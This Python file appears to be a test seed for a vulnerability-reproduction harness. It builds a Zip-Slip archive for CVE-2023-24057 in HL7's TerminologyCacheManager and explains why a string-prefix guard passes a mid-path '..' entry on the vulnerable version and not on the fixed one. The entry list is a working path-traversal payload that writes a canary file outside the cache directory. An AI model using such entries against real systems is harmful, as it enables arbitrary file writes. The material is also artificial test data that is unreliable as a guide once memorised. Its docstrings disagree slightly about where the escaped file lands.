#!/usr/bin/env python3
"""[GIVEN] CVE-2023-24057 seed — Zip-Slip in TerminologyCacheManager.unzip.

The original vulnerability: the entry name is joined to the cache dir with
`Utilities.path`, which only collapses *leading* "../" and otherwise leaves
embedded ".." intact, and the guard is a plain `String.startsWith(targetDir)`.
An entry with a MID-PATH escape keeps the targetDir prefix (so the guard passes)
yet the filesystem resolves the ".." and writes OUTSIDE the cache dir.

Vector (single archive, two entries):
    "x/"                             -> create the intermediate dir so the kernel
                                        can resolve the following "x/..".
    "x/../../../pwned/<flagfile>"    -> written path string still starts with
                                        targetDir (guard passes on V0) but
                                        resolves to <root>/pwned/<flagfile> ==
                                        OUTSIDE the cache dir. (The final path
                                        component is a real name, not "..", so
                                        HL7's CSFile case-check is not tripped.)

Contract (verified on real Docker via oracle.py):
    * V0 = r4b 5.6.90  -> ESCAPE (no normalize; string prefix guard passes,
                          write follows the mid-".." out of the cache dir).
    * V1 = r4b 5.6.92  -> BLOCKED: the CVE-2023-24057 fix normalizes the path to
                          an absolute string BEFORE the startsWith check, so the
                          mid-".." collapses to <root>/cache/<flagfile>, which no
                          longer starts with targetDir -> RuntimeException.

The per-run ${PCB_FLAG} canary flows only as the escaping entry's *content*.
"""
from __future__ import annotations


def entries(flag: str):
    """Return the archive entry list [(name, content), ...] for the CVE-2023-24057
    seed. Escape lands at <root>/cache/escaped.txt (outside <root>/cache/tx-cache)."""
    return [
        ["x/", ""],                                # dir entry: create 'x' so kernel resolves 'x/..'
        ["x/../../../pwned/escaped.txt", flag],    # mid-".." write -> escapes to <root>/pwned/
    ]


def candidate(flag: str):
    return {"id": "cve-2023-24057-original", "entries": entries(flag)}


if __name__ == "__main__":
    import json
    print(json.dumps(candidate("DEMOFLAG"), indent=2))
